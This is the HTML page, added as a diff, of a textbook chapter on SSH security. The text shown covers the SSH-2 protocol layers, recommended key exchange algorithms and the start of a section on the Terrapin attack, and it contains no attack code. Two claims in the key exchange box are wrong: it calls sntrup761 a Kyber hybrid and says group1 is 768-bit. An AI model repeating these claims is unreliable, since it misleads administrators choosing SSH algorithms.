@@ -1,0 +1,1233 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#ffffff">
+<meta name="description" content="The Open Book Project: books on computer science, quantum computing, cyber security, science, the social sciences, university courses and languages, read page by page like an e-book, online or offline.">
+<meta name="author" content="The Open Book Project">
+<link rel="canonical" href="https://open-book-project.github.io/cyber/security_systems_engineering/ch17-ssh-security.html">
+<link rel="prev" href="ch16-transport-layer-security.html">
+<link rel="next" href="ch18-email-security.html">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif:ital,wght@0,400;0,600;0,700;1,400;1,700&display=swap" media="print" onload="this.media='all'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif:ital,wght@0,400;0,600;0,700;1,400;1,700&display=swap"></noscript>
+<link rel="icon" href="../../assets/icons/favicon-32.png" sizes="32x32">
+<link rel="icon" href="../../assets/icons/favicon.svg" type="image/svg+xml">
+<link rel="manifest" href="../../manifest.webmanifest">
+<link rel="apple-touch-icon" href="../../assets/icons/apple-touch-icon.png">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-title" content="Open Book">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<meta name="application-name" content="Open Book"><script src="../../assets/library-data.js"></script><script>
+    (function () {
+      var X = window.XMLHttpRequest, open, gate = new Promise(function (r) { open = r; });
+      if (!X) return;
+      var open0 = X.prototype.open, send0 = X.prototype.send;
+      X.prototype.open = function (method, url) {
+        this.__pkIndex = /\/search\/search_index\.json(\?|#|$)/.test(String(url));
+        return open0.apply(this, arguments);
+      };
+      X.prototype.send = function () {
+        if (!this.__pkIndex) return send0.apply(this, arguments);
+        var xhr = this, args = arguments;
+        gate.then(function () { send0.apply(xhr, args); });
+      };
+      function wake() { open(); }
+      document.addEventListener("focusin", function (e) { if (e.target && e.target.closest && e.target.closest(".md-search")) wake(); });
+      document.addEventListener("click", function (e) { if (e.target && e.target.closest && e.target.closest('label[for="__search"], .md-search')) wake(); }, true);
+      document.addEventListener("keydown", function (e) {
+        var k = e.key;
+        if ((k === "/" || k === "s" || k === "f" || k === "S" || k === "F") && !(e.target && e.target.closest && e.target.closest("input, textarea, [contenteditable]"))) wake();
+      }, true);
+      if (/[?&]q=/.test(location.search)) wake();
+    })();
+  </script><script>
+    try {
+      if ((window.matchMedia && (matchMedia("(display-mode: standalone)").matches || matchMedia("(display-mode: fullscreen)").matches)) || navigator.standalone === true) {
+        document.documentElement.className += " bjp-standalone";
+      }
+    } catch (e) { /* not an installed app */ }
+    /* the books of a subject or of the whole library as covers or as a list (assets/app.js): the reader's choice */
+    try {
+      var bv = localStorage.getItem("bjp.view");
+      if (bv === "list" || (bv !== "grid" && /\/books\.html$/.test(location.pathname))) document.documentElement.className += " bjp-view-list";
+    } catch (e) { /* no storage: covers */ }
+  </script>
+<script>
+    /* a book opened from its cover on the shelf: the page stays blank, in the cover's colour, until the reader is up */
+    try {
+      var cv = sessionStorage.getItem("bjp.reader.cover");
+      if (cv && sessionStorage.getItem("bjp.reader.open") === "1") {
+        var c = JSON.parse(cv), de = document.documentElement;
+        de.className += " bjp-booting";
+        if (c && /^#[0-9a-f]{3,8}$/i.test(c.bg || "")) de.style.background = c.bg;
+        setTimeout(function () { de.classList.remove("bjp-booting"); de.style.background = ""; }, 3000);
+      }
+    } catch (e) { /* no session storage: the page simply opens as usual */ }
+  </script>
+<title>17. SSH Security - The Open Book Project</title>
+<link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+<link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+<link rel="stylesheet" href="../../assets/extra.css">
+<link rel="stylesheet" href="../../assets/reader.css">
+<link rel="stylesheet" href="../../assets/viz.css">
+<link rel="stylesheet" href="../../assets/app.css">
+<link rel="stylesheet" href="../../assets/theme.css">
+<link rel="stylesheet" href="../../assets/slides.css">
+<link rel="stylesheet" href="../../assets/remote.css">
+<link rel="stylesheet" href="../../assets/scans.css">
+<link rel="stylesheet" href="../../assets/speak.css">
+<link rel="stylesheet" href="../../assets/quiz.css">
+<script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+</head>
+<body dir="ltr" data-md-color-scheme="default" data-md-color-primary="custom" data-md-color-accent="custom">
+<input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+<input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+<label class="md-overlay" for="__drawer"></label>
+<div data-md-component="skip">
+<a href="#sec-ssh-architecture" class="md-skip">
+Skip to content
+</a>
+</div>
+<div data-md-component="announce">
+</div>
+<header class="md-header md-header--shadow" data-md-component="header">
+<nav class="md-header__inner md-grid" aria-label="Header">
+<a href="../../index.html" title="The Open Book Project" class="md-header__button md-logo" aria-label="The Open Book Project" data-md-component="logo">
+<img src="../../assets/icons/logo.svg" alt="logo">
+</a>
+<label class="md-header__button md-icon" for="__drawer">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+</label>
+<div class="md-header__title" data-md-component="header-title">
+<div class="md-header__ellipsis">
+<div class="md-header__topic">
+<span class="md-ellipsis">
+The Open Book Project
+</span>
+</div>
+<div class="md-header__topic" data-md-component="header-topic">
+<span class="md-ellipsis">
+17. SSH Security
+</span>
+</div>
+</div>
+</div><a href="../../index.html" class="bjp-libbtn" aria-label="Library: all books" title="Library: all books">
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 20V5h4v15M8 20V9h4v11M14 20L12.6 6l3.8-.8 3 14.2M3 20h18"/></svg><span>Library</span>
+</a>
+<a href="../../subjects/index.html" class="pk-catbtn" aria-haspopup="true" aria-expanded="false" title="Browse the books by category">
+<svg viewBox="0 0 24 24" aria-hidden="true"><rect x="3.5" y="3.5" width="7" height="7" rx="1.6"/><circle cx="17" cy="7" r="3.6"/><path d="M7 13.4l3.9 6.8H3.1z"/><rect x="13.5" y="13.5" width="7" height="7" rx="1.6"/></svg><span>Categories</span>
+</a>
+<form class="md-header__option" data-md-component="palette">
+<input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+<label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+</label>
+<input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+<label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+</label>
+</form>
+<script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+<label class="md-header__button md-icon" for="__search">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+</label>
+<div class="md-search" data-md-component="search" role="dialog">
+<label class="md-search__overlay" for="__search"></label>
+<div class="md-search__inner" role="search">
+<form class="md-search__form" name="search">
+<input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+<label class="md-search__icon md-icon" for="__search">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+</label>
+<nav class="md-search__options" aria-label="Search">
+<button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+</button>
+</nav>
+<div class="md-search__suggest" data-md-component="search-suggest"></div>
+</form>
+<div class="md-search__output">
+<div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+<div class="md-search-result" data-md-component="search-result">
+<div class="md-search-result__meta">
+Initializing search
+</div>
+<ol class="md-search-result__list" role="presentation"></ol>
+</div>
+</div>
+</div>
+</div>
+</div>
+</nav>
+</header>
+<div class="md-container" data-md-component="container">
+<main class="md-main" data-md-component="main">
+<div class="md-main__inner md-grid">
+<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav class="md-nav md-nav--primary bjp-nav bjp-nav--book" aria-label="Navigation" data-md-level="0">
+<label class="md-nav__title" for="__drawer">
+<a href="../../index.html" title="The Open Book Project" class="md-nav__button md-logo" aria-label="The Open Book Project" data-md-component="logo">
+<img src="../../assets/icons/logo.svg" alt="logo">
+</a>
+The Open Book Project
+</label>
+<ul class="md-nav__list" data-md-scrollfix>
+<li class="md-nav__item bjp-nav-all">
+<a href="../../index.html" class="md-nav__link" aria-label="All books: back to the library">
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M19 12H5M11 6l-6 6 6 6"/></svg>
+<span class="md-ellipsis">All books</span>
+</a>
+</li>
+<li class="md-nav__item bjp-nav-book" role="presentation"><span class="bjp-nav-head">Security Systems Engineering</span></li>
+<li class="md-nav__item">
+<a href="index.html" class="md-nav__link">
+<span class="md-ellipsis">
+Overview and preface
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="notation-and-conventions.html" class="md-nav__link">
+<span class="md-ellipsis">
+Notation and Conventions
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch01-mathematical-foundations-of-cryptography.html" class="md-nav__link">
+<span class="md-ellipsis">
+1. Mathematical Foundations of Cryptography
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch02-symmetric-cryptography.html" class="md-nav__link">
+<span class="md-ellipsis">
+2. Symmetric Cryptography
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch03-public-key-cryptography.html" class="md-nav__link">
+<span class="md-ellipsis">
+3. Public-Key Cryptography
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch04-cryptographic-hash-functions-and-macs.html" class="md-nav__link">
+<span class="md-ellipsis">
+4. Cryptographic Hash Functions and MACs
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch05-key-management-and-public-key-infrastructure.html" class="md-nav__link">
+<span class="md-ellipsis">
+5. Key Management and Public Key Infrastructure
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch06-cryptographic-protocols-and-security-proofs.html" class="md-nav__link">
+<span class="md-ellipsis">
+6. Cryptographic Protocols and Security Proofs
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch07-quantum-cryptography-and-post-quantum-migration.html" class="md-nav__link">
+<span class="md-ellipsis">
+7. Quantum Cryptography and Post-Quantum Migration
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch08-network-security-fundamentals.html" class="md-nav__link">
+<span class="md-ellipsis">
+8. Network Security Fundamentals
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch09-firewalls-ids-and-ips.html" class="md-nav__link">
+<span class="md-ellipsis">
+9. Firewalls, IDS, and IPS
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch10-network-protocol-security.html" class="md-nav__link">
+<span class="md-ellipsis">
+10. Network Protocol Security
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch11-web-application-security-fundamentals.html" class="md-nav__link">
+<span class="md-ellipsis">
+11. Web Application Security Fundamentals
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch12-authentication-authorization-and-access-control.html" class="md-nav__link">
+<span class="md-ellipsis">
+12. Authentication, Authorization, and Access Control
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch13-api-security.html" class="md-nav__link">
+<span class="md-ellipsis">
+13. API Security
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch14-side-channel-attacks.html" class="md-nav__link">
+<span class="md-ellipsis">
+14. Side-Channel Attacks
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch15-hardware-tamper-protection.html" class="md-nav__link">
+<span class="md-ellipsis">
+15. Hardware Tamper Protection
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch16-transport-layer-security.html" class="md-nav__link">
+<span class="md-ellipsis">
+16. Transport Layer Security
+</span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--active">
+<input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+<label class="md-nav__link md-nav__link--active" for="__toc">
+<span class="md-ellipsis">
+17. SSH Security
+</span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<a href="ch17-ssh-security.html" class="md-nav__link md-nav__link--active">
+<span class="md-ellipsis">
+17. SSH Security
+</span>
+</a>
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+<label class="md-nav__title" for="__toc">
+<span class="md-nav__icon md-icon"></span>
+Table of contents
+</label>
+<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+<li class="md-nav__item">
+<a href="#sec-ssh-architecture" class="md-nav__link">
+<span class="md-ellipsis">
+17.1 SSH-2 Protocol Architecture
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-kex" class="md-nav__link">
+<span class="md-ellipsis">
+17.2 Key Exchange
+</span>
+</a>
+<nav class="md-nav" aria-label="17.2 Key Exchange">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a href="#sec-terrapin" class="md-nav__link">
+<span class="md-ellipsis">
+17.2.1 The Terrapin Attack (CVE-2023-48795)
+</span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-host-keys" class="md-nav__link">
+<span class="md-ellipsis">
+17.3 Host Key Verification
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-auth" class="md-nav__link">
+<span class="md-ellipsis">
+17.4 Authentication Methods
+</span>
+</a>
+<nav class="md-nav" aria-label="17.4 Authentication Methods">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a href="#1741-password-authentication" class="md-nav__link">
+<span class="md-ellipsis">
+17.4.1 Password Authentication
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#1742-public-key-authentication" class="md-nav__link">
+<span class="md-ellipsis">
+17.4.2 Public Key Authentication
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-certificates" class="md-nav__link">
+<span class="md-ellipsis">
+17.4.3 SSH Certificate-Based Authentication
+</span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-kex-diagram" class="md-nav__link">
+<span class="md-ellipsis">
+17.5 Key Exchange Diagram
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-hardening" class="md-nav__link">
+<span class="md-ellipsis">
+17.6 Hardening sshd_config
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-tunneling" class="md-nav__link">
+<span class="md-ellipsis">
+17.7 SSH Tunneling
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-jump" class="md-nav__link">
+<span class="md-ellipsis">
+17.8 Jump Hosts and ProxyJump
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-attacks" class="md-nav__link">
+<span class="md-ellipsis">
+17.9 Common SSH Attacks and Defences
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-bastion" class="md-nav__link">
+<span class="md-ellipsis">
+17.10 Bastion Architecture with Session Recording
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-exercises" class="md-nav__link">
+<span class="md-ellipsis">
+17.11 Exercises
+</span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a href="ch18-email-security.html" class="md-nav__link">
+<span class="md-ellipsis">
+18. Email Security
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch19-advanced-network-protocol-security.html" class="md-nav__link">
+<span class="md-ellipsis">
+19. Advanced Network Protocol Security
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch20-malware-analysis.html" class="md-nav__link">
+<span class="md-ellipsis">
+20. Malware Analysis
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch21-reverse-engineering.html" class="md-nav__link">
+<span class="md-ellipsis">
+21. Reverse Engineering
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch22-digital-forensics.html" class="md-nav__link">
+<span class="md-ellipsis">
+22. Digital Forensics
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch23-vulnerability-research-and-fuzzing.html" class="md-nav__link">
+<span class="md-ellipsis">
+23. Vulnerability Research and Fuzzing
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch24-exploit-development-fundamentals.html" class="md-nav__link">
+<span class="md-ellipsis">
+24. Exploit Development Fundamentals
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch25-security-architecture-and-design.html" class="md-nav__link">
+<span class="md-ellipsis">
+25. Security Architecture and Design
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch26-cloud-native-security.html" class="md-nav__link">
+<span class="md-ellipsis">
+26. Cloud-Native Security
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch27-human-factors-in-security.html" class="md-nav__link">
+<span class="md-ellipsis">
+27. Human Factors in Security
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch28-artificial-intelligence-and-machine-learning.html" class="md-nav__link">
+<span class="md-ellipsis">
+28. Artificial Intelligence and Machine Learning Security
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="ch29-iot-industrial-control-systems-and-the-emerging.html" class="md-nav__link">
+<span class="md-ellipsis">
+29. IoT, Industrial Control Systems, and the Emerging Threat Horizon
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="app-a-mathematical-reference.html" class="md-nav__link">
+<span class="md-ellipsis">
+Appendix A. Mathematical Reference
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="app-b-security-tools-reference.html" class="md-nav__link">
+<span class="md-ellipsis">
+Appendix B. Security Tools Reference
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="app-c-selected-exercise-solutions.html" class="md-nav__link">
+<span class="md-ellipsis">
+Appendix C. Selected Exercise Solutions
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="bibliography.html" class="md-nav__link">
+<span class="md-ellipsis">
+References
+</span>
+</a>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+<label class="md-nav__title" for="__toc">
+<span class="md-nav__icon md-icon"></span>
+Table of contents
+</label>
+<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+<li class="md-nav__item">
+<a href="#sec-ssh-architecture" class="md-nav__link">
+<span class="md-ellipsis">
+17.1 SSH-2 Protocol Architecture
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-kex" class="md-nav__link">
+<span class="md-ellipsis">
+17.2 Key Exchange
+</span>
+</a>
+<nav class="md-nav" aria-label="17.2 Key Exchange">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a href="#sec-terrapin" class="md-nav__link">
+<span class="md-ellipsis">
+17.2.1 The Terrapin Attack (CVE-2023-48795)
+</span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-host-keys" class="md-nav__link">
+<span class="md-ellipsis">
+17.3 Host Key Verification
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-auth" class="md-nav__link">
+<span class="md-ellipsis">
+17.4 Authentication Methods
+</span>
+</a>
+<nav class="md-nav" aria-label="17.4 Authentication Methods">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a href="#1741-password-authentication" class="md-nav__link">
+<span class="md-ellipsis">
+17.4.1 Password Authentication
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#1742-public-key-authentication" class="md-nav__link">
+<span class="md-ellipsis">
+17.4.2 Public Key Authentication
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-certificates" class="md-nav__link">
+<span class="md-ellipsis">
+17.4.3 SSH Certificate-Based Authentication
+</span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-kex-diagram" class="md-nav__link">
+<span class="md-ellipsis">
+17.5 Key Exchange Diagram
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-hardening" class="md-nav__link">
+<span class="md-ellipsis">
+17.6 Hardening sshd_config
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-tunneling" class="md-nav__link">
+<span class="md-ellipsis">
+17.7 SSH Tunneling
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-jump" class="md-nav__link">
+<span class="md-ellipsis">
+17.8 Jump Hosts and ProxyJump
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-attacks" class="md-nav__link">
+<span class="md-ellipsis">
+17.9 Common SSH Attacks and Defences
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-bastion" class="md-nav__link">
+<span class="md-ellipsis">
+17.10 Bastion Architecture with Session Recording
+</span>
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#sec-ssh-exercises" class="md-nav__link">
+<span class="md-ellipsis">
+17.11 Exercises
+</span>
+</a>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-content" data-md-component="content">
+<article class="md-content__inner md-typeset">
+<h1 id="ch-ssh-security">Chapter 17: SSH Security<a class="headerlink" href="#ch-ssh-security" title="Permanent link">&para;</a></h1>
+<p>Secure Shell is the backbone of remote server administration, replacing insecure predecessors such as Telnet and rsh. Despite its ubiquity, SSH is frequently misconfigured, letting attackers pivot across infrastructure, establish covert tunnels, or harvest credentials. This chapter dissects the SSH-2 protocol, examines every authentication method, and builds hardened server configurations from the ground up.</p>
+<h2 id="sec-ssh-architecture"><span class="secnum">17.1</span> SSH-2 Protocol Architecture<a class="headerlink" href="#sec-ssh-architecture" title="Permanent link">&para;</a></h2>
+<p>SSH-2 supersedes the insecure SSH-1 (which suffered from a CRC32 manipulation vulnerability) and is mandated by RFC 4251–4254. The protocol is organised into three layered sub-protocols.</p>
+<div class="admonition info box-definition kind-concept">
+<p class="admonition-title">Definition 17.1 (SSH Protocol Layers)</p>
+<p>SSH-2 is composed of three logically separate layers that operate over TCP port 22:</p>
+<ol>
+<li>
+<p><strong>Transport Layer</strong> (RFC 4253) – Handles key exchange, server authentication, encryption, and integrity protection. Provides a binary packet protocol with negotiated algorithms.</p>
+</li>
+<li>
+<p><strong>User Authentication Layer</strong> (RFC 4252) – Authenticates the client to the server using methods such as <code>publickey</code>, <code>password</code>, and <code>keyboard-interactive</code>.</p>
+</li>
+<li>
+<p><strong>Connection Layer</strong> (RFC 4254) – Multiplexes the authenticated session into logical channels: interactive shells, exec commands, port-forwarding, and X11 forwarding.</p>
+</li>
+</ol>
+</div>
+<p>The SSH handshake proceeds in five steps: (1) version exchange, (2) algorithm negotiation (<code>SSH_MSG_KEXINIT</code>), (3) key exchange producing a shared secret, (4) server host key verification, and (5) service request to begin authentication.</p>
+<h2 id="sec-ssh-kex"><span class="secnum">17.2</span> Key Exchange<a class="headerlink" href="#sec-ssh-kex" title="Permanent link">&para;</a></h2>
+<p>Key exchange establishes a shared session key without transmitting it over the network. The negotiated KEX algorithm appears in the <code>KexAlgorithms</code> field of <code>sshd_config</code>.</p>
+<div class="admonition info box-definition kind-concept">
+<p class="admonition-title">Definition 17.2 (Diffie-Hellman Group 14 SHA-256)</p>
+<p><code>diffie-hellman-group14-sha256</code> uses a 2048-bit MODP group (RFC 3526, Group 14). The shared secret is hashed with SHA-256 to derive symmetric keys. Acceptable for compatibility but inferior to elliptic-curve methods.</p>
+</div>
+<div class="admonition info box-definition kind-concept">
+<p class="admonition-title">Definition 17.3 (curve25519-sha256)</p>
+<p><code>curve25519-sha256</code> (RFC 8731) performs an ECDH key exchange on Curve25519. It provides 128 bits of security, is resistant to implementation timing attacks, and is the <em>recommended</em> default for modern deployments.</p>
+</div>
+<div class="admonition info box-keybox kind-concept">
+<p class="admonition-title">Recommended KEX Algorithms (2024+)</p>
+<p>Prefer in order:</p>
+<ol>
+<li>
+<p><code>curve25519-sha256</code> – Curve25519 ECDH, fastest and most secure</p>
+</li>
+<li>
+<p><code>sntrup761x25519-sha512@openssh.com</code> – Post-quantum hybrid (CRYSTALS-Kyber + Curve25519)</p>
+</li>
+<li>
+<p><code>diffie-hellman-group16-sha512</code> – 4096-bit DH, fallback</p>
+</li>
+</ol>
+<p>Avoid: <code>diffie-hellman-group1-sha1</code> (Logjam-vulnerable 768-bit), <code>diffie-hellman-group-exchange-sha1</code>.</p>
+</div>
+<h3 id="sec-terrapin"><span class="secnum">17.2.1</span> The Terrapin Attack (CVE-2023-48795)<a class="headerlink" href="#sec-terrapin" title="Permanent link">&para;</a></h3>
+<p>Disclosed in December 2023 by Bäumer, Brinkmann, and Schwenk, Terrapin is a <em>prefix truncation attack</em> on the SSH binary packet protocol. It targets specific cipher mode combinations — specifically <code>chacha20-poly1305@openssh.com</code> and any cipher in <code>-etm@openssh.com</code> (Encrypt-then-MAC) mode for CBC ciphers — that were, at the time of disclosure, the strongest algorithm choices available and widely recommended.</p>
